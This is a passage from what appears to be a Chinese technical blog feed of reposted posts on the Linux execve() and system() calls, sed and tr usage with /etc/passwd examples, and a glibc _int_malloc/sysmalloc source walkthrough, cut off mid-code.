表头文件： <span class="hljs-meta">#<span class="hljs-keyword">include</span> unistd.h</span><br><br> 定义函数： <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> * filename,<span class="hljs-type">char</span> * <span class="hljs-type">const</span> argv[ ],<span class="hljs-type">char</span> * <span class="hljs-type">const</span> envp[ ])</span></span>;<br><br> 函数说明： <span class="hljs-built_in">execve</span>()用来执行参数filename字符串所代表的文件路径，第二个参数系利用数组指针来传递给执行文件，最后一个参数则为传递给执行文件的新环境变量数组。<br><br> 返回值：   如果执行成功则函数不会返回，执行失败则直接返回<span class="hljs-number">-1</span>，失败原因存于errno 中。<br><br> 错误代码:<br><br> EACCES<br><br><span class="hljs-number">1.</span> 欲执行的文件不具有用户可执行的权限。<br><span class="hljs-number">2.</span> 欲执行的文件所属的文件系统是以noexec 方式挂上。<br><span class="hljs-number">3.</span> 欲执行的文件或script翻译器非一般文件。<br><br> EPERM<br><br><span class="hljs-number">1.</span>进程处于被追踪模式，执行者并不具有root权限，欲执行的文件具有SUID 或SGID 位。<br><br><span class="hljs-number">2.</span>欲执行的文件所属的文件系统是以nosuid方式挂上，欲执行的文件具有SUID 或SGID 位元，但执行者并不具有root权限。<br><br>E2BIG 参数数组过大<br><br> ENOEXEC 无法判断欲执行文件的执行文件格式，有可能是格式错误或无法在此平台执行。<br><br> EFAULT 参数filename所指的字符串地址超出可存取空间范围。<br><br> ENAMETOOLONG 参数filename所指的字符串太长。<br><br> ENOENT 参数filename字符串所指定的文件不存在。<br><br> ENOMEM 核心内存不足<br><br> ENOTDIR 参数filename字符串所包含的目录路径并非有效目录<br><br> EACCES 参数filename字符串所包含的目录路径无法存取，权限不足<br><br> ELOOP 过多的符号连接<br><br> ETXTBUSY 欲执行的文件已被其他进程打开而且正把数据写入该文件中<br><br> EIO I/O 存取错误<br><br> ENFILE 已达到系统所允许的打开文件总数。<br><br> EMFILE 已达到系统所允许单一进程所能打开的文件总数。<br><br> EINVAL 欲执行文件的ELF执行格式不只一个PT_INTERP节区<br><br> EISDIR ELF翻译器为一目录<br><br> ELIBBAD ELF翻译器有问题。<br></code></pre></td></tr></table></figure><h3 id="2-system-函数"><a href="#2-system-函数" class="headerlink" title="2. system()函数"></a>2. system()函数</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gauss">相关函数： fork，execve，waitpid，popen<br><br>表头文件： <span class="hljs-meta">#<span class="hljs-keyword">include</span> stdlib.h</span><br><br>定义函数： int <span class="hljs-keyword">system</span>(const char * string);<br><br>函数说明： <span class="hljs-keyword">system</span>()会调用<span class="hljs-built_in">fork</span>()产生子进程，由子进程来调用/bin/sh  c <span class="hljs-keyword">string</span>来执行参数<span class="hljs-keyword">string</span>字符串所代表的命令，此命&gt;令执行完后随即返回原调用的进程。在调用<span class="hljs-keyword">system</span>()期间SIGCHLD 信号会被暂时搁置，SIGINT和SIGQUIT 信号则会被忽略。<br><br>返回值：<br><br>    =<span class="hljs-number">-1</span>:出现错误<br>    =<span class="hljs-number">0</span>:调用成功但是没有出现子进程<br>    &gt;<span class="hljs-number">0</span>:成功退出的子进程的id<br><br>如果<span class="hljs-keyword">system</span>()在调用/bin/sh时失败则返回<span class="hljs-number">127</span>，其他失败原因返回<span class="hljs-number">-1</span>。若参数<span class="hljs-keyword">string</span>为空指针(<span class="hljs-built_in">NULL</span>)，则返回非零值&gt;。 如果<span class="hljs-keyword">system</span>()调用成功则最后会返回执行<span class="hljs-built_in">shell</span>命令后的返回值，但是此返回值也有可能为 <span class="hljs-keyword">system</span>()调用/bin/sh失败所返回的<span class="hljs-number">127</span>，因此最好能再检查errno 来确认执行成功。<br><br>附加说明： 在编写具有SUID/SGID权限的程序时请勿使用<span class="hljs-keyword">system</span>()，<span class="hljs-keyword">system</span>()会继承环境变量，通过环境变量可能会造成系统安全的问题。<br></code></pre></td></tr></table></figure><h3 id="3-execl-函数"><a href="#3-execl-函数" class="headerlink" title="3. execl()函数"></a>3. execl()函数</h3><p>int execl(const char * filename,char * const argv[ ],char * const envp[ ]);</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>系统函数</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux中常见指令解释</title>
    <link href="/2023/11/09/linux%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4%E8%A7%A3%E9%87%8A/"/>
    <url>/2023/11/09/linux%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4%E8%A7%A3%E9%87%8A/</url>
    
    <content type="html"><![CDATA[<h3 id="1-sed"><a href="#1-sed" class="headerlink" title="1. sed"></a>1. sed</h3><p>sed是一个经常被忽视的指令，但是sed使用范围十分广阔，这里介绍其几个简单的使用方法</p><p><strong>语法：</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sed <span class="hljs-selector-attr">[-hnV]</span><span class="hljs-selector-attr">[-e&lt;script&gt;]</span><span class="hljs-selector-attr">[-f&lt;script文件&gt;]</span><span class="hljs-selector-attr">[文本文件]</span><br></code></pre></td></tr></table></figure><p><strong>参数说明：</strong></p><ul><li>-e&lt;script&gt;或–expression&#x3D;&lt;script&gt; 以选项中指定的script来处理输入的文本文件。</li><li>-f&lt;script文件&gt;或–file&#x3D;&lt;script文件&gt; 以选项中指定的script文件来处理输入的文本文件。</li><li>-h或–help 显示帮助。</li><li>-n或–quiet或–silent 仅显示script处理后的结果。</li><li>-V或–version 显示版本信息。</li></ul><p><strong>动作说明：</strong></p><ul><li>a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～</li><li>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！</li><li>d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；</li><li>i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</li><li>p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～</li><li>s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法</li></ul><p><strong>范例：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">将 /etc/passwd 的内容列出并且列印行号，同时，请将第 2~5 行删除！</span><br>[root@www ~]# nl /etc/passwd | sed &#x27;2,5d&#x27;<br>1 root:x:0:0:root:/root:/bin/bash<br>6 sync:x:5:0:sync:/sbin:/bin/sync<br>7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">　在第二行后(亦即是加在第三行)加上『drink tea?』字样</span><br>[root@www ~]# nl /etc/passwd | sed &#x27;2a drink tea&#x27;<br>1 root:x:0:0:root:/root:/bin/bash<br>2 bin:x:1:1:bin:/bin:/sbin/nologin<br>drink tea<br>3 daemon:x:2:2:daemon:/sbin:/sbin/nologin<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">在第二行前</span><br>[root@www ~]# nl /etc/passwd | sed &#x27;2i drink tea&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">要增加两行以上（在第二行后面加入两行字）</span><br>[root@www ~]# nl /etc/passwd | sed &#x27;2a Drink tea or ......\<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">drink beer ?<span class="hljs-string">&#x27;</span></span><br>1 root:x:0:0:root:/root:/bin/bash<br>2 bin:x:1:1:bin:/bin:/sbin/nologin<br>Drink tea or ......<br>drink beer ?<br>3 daemon:x:2:2:daemon:/sbin:/sbin/nologin<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-string">　将第2-5行的内容取代成为『No 2-5 number』</span></span><br>[root@www ~]# nl /etc/passwd | sed &#x27;2,5c No 2-5 number&#x27;<br>1 root:x:0:0:root:/root:/bin/bash<br>No 2-5 number<br>6 sync:x:5:0:sync:/sbin:/bin/sync<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">仅列出 /etc/passwd 文件内的第 5-7 行</span></span><br>[root@www ~]# nl /etc/passwd | sed -n &#x27;5,7p&#x27;<br>5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br>6 sync:x:5:0:sync:/sbin:/bin/sync<br>7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">搜索 /etc/passwd有root关键字的行(所有)</span></span><br>[root@www ~]# nl /etc/passwd | sed &#x27;/root/p&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">使用-n的时候将只打印包含模板的行</span></span><br>nl /etc/passwd | sed -n &#x27;/root/p&#x27;<br>1  root:x:0:0:root:/root:/bin/bash<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">数据的搜寻并删除</span></span><br>nl /etc/passwd | sed  &#x27;/root/d&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">数据的搜寻并执行命令。执行后面花括号中的一组命令，每个命令之间用分号分隔，这里把bash替换为blueshell，再输出这行</span></span><br>nl /etc/passwd | sed -n &#x27;/bash/&#123;s/bash/blueshell/;p;q&#125;&#x27;    <br>1  root:x:0:0:root:/root:/bin/blueshell<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">数据的搜寻并替换</span></span><br>sed &#x27;s/要被取代的字串/新的字串/g&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">多点编辑</span></span><br>nl /etc/passwd | sed -e &#x27;3,$d&#x27; -e &#x27;s/bash/blueshell/&#x27;<br>1  root:x:0:0:root:/root:/bin/blueshell<br>2  daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br></code></pre></td></tr></table></figure><h3 id="2-tr"><a href="#2-tr" class="headerlink" title="2. tr"></a>2. tr</h3><p><strong>语法</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">tr</span> <span class="hljs-selector-attr">[-cdst]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--version]</span><span class="hljs-selector-attr">[第一字符集]</span><span class="hljs-selector-attr">[第二字符集]</span>  <br><span class="hljs-selector-tag">tr</span> <span class="hljs-selector-attr">[OPTION]</span>…SET1<span class="hljs-selector-attr">[SET2]</span> <br></code></pre></td></tr></table></figure><p><strong>参数说明</strong></p><ul><li>-c, –complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换</li><li>-d, –delete：删除指令字符</li><li>-s, –squeeze-repeats：缩减连续重复的字符成指定的单个字符</li><li>-t, –truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等</li></ul><p><strong>字符集</strong></p><ul><li>\NNN 八进制值的字符 NNN (1 to 3 为八进制值的字符)</li><li>\ 反斜杠</li><li>\a Ctrl-G 铃声</li><li>\b Ctrl-H 退格符</li><li>\f Ctrl-L 走行换页</li><li>\n Ctrl-J 新行</li><li>\r Ctrl-M 回车</li><li>\t Ctrl-I tab键</li><li>\v Ctrl-X 水平制表符</li><li>CHAR1-CHAR2 ：字符范围从 CHAR1 到 CHAR2 的指定，范围的指定以 ASCII 码的次序为基础，只能由小到大，不能由大到小。</li><li>[CHAR*] ：这是 SET2 专用的设定，功能是重复指定的字符到与 SET1 相同长度为止</li><li>[CHAR*REPEAT] ：这也是 SET2 专用的设定，功能是重复指定的字符到设定的 REPEAT 次数为止(REPEAT 的数字采 8 进位制计算，以 0 为开始)</li><li>[:alnum:] ：所有字母字符与数字</li><li>[:alpha:] ：所有字母字符</li><li>[:blank:] ：所有水平空格</li><li>[:cntrl:] ：所有控制字符</li><li>[:digit:] ：所有数字</li><li>[:graph:] ：所有可打印的字符(不包含空格符)</li><li>[:lower:] ：所有小写字母</li><li>[:print:] ：所有可打印的字符(包含空格符)</li><li>[:punct:] ：所有标点字符</li><li>[:space:] ：所有水平与垂直空格符</li><li>[:upper:] ：所有大写字母</li><li>[:xdigit:] ：所有 16 进位制的数字</li><li>[&#x3D;CHAR&#x3D;] ：所有符合指定的字符(等号里的 CHAR，代表你可自订的字符)</li></ul><h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p><a href="https://introspelliam.github.io/">本文章装载于此</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>常用命令</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>malloc源码分析——2</title>
    <link href="/2023/11/09/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%942/"/>
    <url>/2023/11/09/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%942/</url>
    
    <content type="html"><![CDATA[<h1 id="malloc源码分析—-int-malloc"><a href="#malloc源码分析—-int-malloc" class="headerlink" title="malloc源码分析—_int_malloc"></a>malloc源码分析—_int_malloc</h1><p>根据上一章的分析，malloc会调用<code>__libc_malloc</code>分配内存，<code>__libc_malloc</code>会调用<code>malloc_hook_ini</code> 进行初始化，然后回调<code>__libc_malloc</code>函数，这时候会执行<code>_int_malloc</code>开始分配内存，定义在malloc.c中，因为非常长，这里分段来看，</p><h2 id="int-malloc第一部分"><a href="#int-malloc第一部分" class="headerlink" title="_int_malloc第一部分"></a>_int_malloc第一部分</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">static</span> <span class="hljs-type">void</span> * _int_malloc(mstate av, <span class="hljs-type">size_t</span> bytes) &#123;<br>    INTERNAL_SIZE_T nb;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx;<br>    mbinptr bin;<br><br>    mchunkptr victim;<br>    INTERNAL_SIZE_T size;<br>    <span class="hljs-type">int</span> victim_index;<br><br>    mchunkptr remainder;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bit;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map;<br><br>    mchunkptr fwd;<br>    mchunkptr bck;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-built_in">checked_request2size</span>(bytes, nb);<br><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(av == <span class="hljs-literal">NULL</span>)) &#123;<br>        <span class="hljs-type">void</span> *p = <span class="hljs-built_in">sysmalloc</span>(nb, av);<br>        <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-built_in">alloc_perturb</span>(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br><br>    ...<br></code></pre></td></tr></table></figure><p>首先调用<code>checked_request2size</code>将需要分配的内存大小bytes转换为chunk的大小。<code>checked_request2size</code>是个宏定义，主要调用request2size进行计算，</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#define request2size(req)                                         \</span><br>  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             <span class="hljs-string">\</span><br>   MINSIZE :                                                      <span class="hljs-string">\</span><br>   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)<br></code></pre></td></tr></table></figure><p>为了说明request2size，首先看一下ptmalloc中关于chunk的定义，</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">struct</span> <span class="hljs-type">malloc_chunk</span> &#123;<br><br>    INTERNAL_SIZE_T prev_size;<br>    INTERNAL_SIZE_T size;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">malloc_chunk</span>* fd; <br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">malloc_chunk</span>* bk;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">malloc_chunk</span>* fd_nextsize; <span class="hljs-comment">/* double links -- used only if free. */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">malloc_chunk</span>* bk_nextsize;<br>&#125;;<br></code></pre></td></tr></table></figure><p>当一个chunk为空闲时，至少要有<code>prev_size</code>、<code>size</code>、<code>fd</code>和<code>bk</code>四个参数，因此MINSIZE就代表了这四个参数需要占用的内存大小；而当一个chunk被使用时，<code>prev_size</code>可能会被前一个chunk用来存储，<code>fd</code>和<code>bk</code>也会被当作内存存储数据，因此当chunk被使用时，只剩下了<code>size</code>参数需要设置，<code>request2size</code>中的<code>SIZE_SZ</code>就是<code>INTERNAL_SIZE_T</code>类型的大小，因此至少需要<code>req+SIZE_SZ</code>的内存大小。<code>MALLOC_ALIGN_MASK</code>用来对齐，因此request2size就计算出了所需的chunk的大小。</p><p>传入的参数av是在上一章<code>__libc_malloc</code>中调用<code>arena_get</code>获得的分配去指针，如果为null，就表示没有分配区可用，这时候就直接调用<code>sysmalloc</code>通过mmap获取chunk。</p><h2 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h2><p><code>sysmalloc</code>的代码很长，但只有前面一小部分是这里需要分析的，</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> * <span class="hljs-title">sysmalloc</span><span class="hljs-params">(INTERNAL_SIZE_T nb, mstate av)</span> </span>&#123;<br>    mchunkptr old_top;<br>    INTERNAL_SIZE_T old_size;<br>    <span class="hljs-type">char</span> *old_end;<br><br>    <span class="hljs-type">long</span> size;<br>    <span class="hljs-type">char</span> *brk;<br><br>    <span class="hljs-type">long</span> correction;<br>    <span class="hljs-type">char</span> *snd_brk;<br><br>    INTERNAL_SIZE_T front_misalign;<br>    INTERNAL_SIZE_T end_misalign;<br>    <span class="hljs-type">char</span> *aligned_brk;<br><br>    mchunkptr p;<br>    mchunkptr remainder;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;<br><br>    <span class="hljs-type">size_t</span> pagesize = <span class="hljs-built_in">GLRO</span>(dl_pagesize);<br>    <span class="hljs-type">bool</span> tried_mmap = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span><br>            || ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (mp_.mmap_threshold)<br>                    &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123;<br>        <span class="hljs-type">char</span> *mm;<br><br>        try_mmap:<br>        <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>            size = <span class="hljs-built_in">ALIGN_UP</span>(nb + SIZE_SZ, pagesize);<br>        <span class="hljs-keyword">else</span><br>            size = <span class="hljs-built_in">ALIGN_UP</span>(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);<br>        tried_mmap = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)) &#123;<br>            mm = (<span class="hljs-type">char</span> *) (<span class="hljs-built_in">MMAP</span>(<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));<br><br>            <span class="hljs-keyword">if</span> (mm != MAP_FAILED) &#123;<br><br>                <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ) &#123;<br>                    <span class="hljs-built_in">assert</span>(<br>                            ((INTERNAL_SIZE_T) <span class="hljs-built_in">chunk2mem</span> (mm) &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>                    front_misalign = <span class="hljs-number">0</span>;<br>                &#125; <span class="hljs-keyword">else</span><br>                    front_misalign = (INTERNAL_SIZE_T) <span class="hljs-built_in">chunk2mem</span>(<br>                            mm) &amp; MALLOC_ALIGN_MASK;<br>                <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>) &#123;<br>                    correction = MALLOC_ALIGNMENT - front_misalign;<br>                    p = (mchunkptr) (mm + correction);<br>                    p-&gt;prev_size = correction;<br>                    <span class="hljs-built_in">set_head</span>(p, (size - correction) | IS_MMAPPED);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = (mchunkptr) mm;<br>                    <span class="hljs-built_in">set_head</span>(p, size | IS_MMAPPED);<br>                &#125;<br><br>                <span class="hljs-type">int</span> <span class="hljs-keyword">new</span> = <span class="hljs-built_in">atomic_exchange_and_add</span>(&amp;mp_.n_mmaps, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>                <span class="hljs-built_in">atomic_max</span>(&amp;mp_.max_n_mmaps, <span class="hljs-keyword">new</span>);<br><br>                <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum;<br>                sum = <span class="hljs-built_in">atomic_exchange_and_add</span>(&amp;mp_.mmapped_mem, size) + size;<br>                <span class="hljs-built_in">atomic_max</span>(&amp;mp_.max_mmapped_mem, sum);<br><br>                <span class="hljs-built_in">check_chunk</span> (av, p);<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">chunk2mem</span>(p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    ...<br></code></pre></td></tr></table></figure><p>首先，可以直接通过mmap分配chunk有两个前提条件，一是需要分配的内存大小大于实用mmap进行分配的阀值<code>mp_.mmap_threshold</code>，二是通过<code>mp_.n_mmaps</code>判断系统还可以有可以使用mmap分配的空间。<br>下面就要计算需要分配多少内存，在前面已经通过<code>request2size</code>计算了需要分配的内存大小，这里为什么还要计算呢？这是因为通过使用mmap直接分配的chunk不需要添加到链表中，因此不存在前后关系，当一个chunk被使用时，不能借用后一个chunk的<code>prev_size</code>字段，这里需要把该字段的长度SIZE_SZ加上。并且这里假设<code>MALLOC_ALIGNMENT == 2 * SIZE_SZ</code>。<br>接下来判断需要分配的内存大小是否会溢出，然后就调用<code>MMAP</code>分配内存，<code>MMAP</code>是一个宏定义，最后就是通过系统调用来分配内存，后面来看这个函数。<br>再往下就是通过<code>set_head</code>在chunk中的size参数里设置标志位，因为chunk是按8字节对齐的，而size标识chunk占用的字节数，所以最后三位是没有用的，ptmalloc将这三位用来作为标志位，这里便是设置其中一个标志位，用来标识该chunk是直接通过mmap分配的。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">#define set_head(<span class="hljs-name">p</span>, s)       ((<span class="hljs-name">p</span>)-&gt;size = (<span class="hljs-name">s</span>))<br></code></pre></td></tr></table></figure><p>设置完标志位后，接下来就是设置全局变量<code>_mp</code>，将<code>mp_.n_mmaps</code>加1，表示当前进程通过mmap分配的chunk个数，对应的<code>mp_.max_n_mmaps</code>表示最大chunk个数。<code>mp_.mmapped_mem</code>标识已经通过mmap分配的内存大小，<code>mp_.max_mmapped_mem</code>对应可分配内存的最大值。其中，<code>atomic_exchange_and_add</code>b表示原子加，<code>atomic_max</code>则是原子取最大值。<br>最后，通过chunk2mem返回chunk中内存的起始指针。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr">#define chunk2</span>mem<span class="hljs-comment">(p)</span>   <span class="hljs-comment">((void*)</span><span class="hljs-comment">((char*)</span><span class="hljs-comment">(p)</span> + <span class="hljs-number">2</span>*SIZE_SZ))<br></code></pre></td></tr></table></figure><p>这里也可以知道，当chunk被使用时，用户是从结构体中的变量fd开始使用内存的。回到_int_malloc函数中，假设通过sysmalloc分配成功，接下来就需要调用alloc_perturb对刚刚分配的内存进行初始化，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">alloc_perturb</span><span class="hljs-params">(<span class="hljs-type">char</span> *p, <span class="hljs-type">size_t</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> 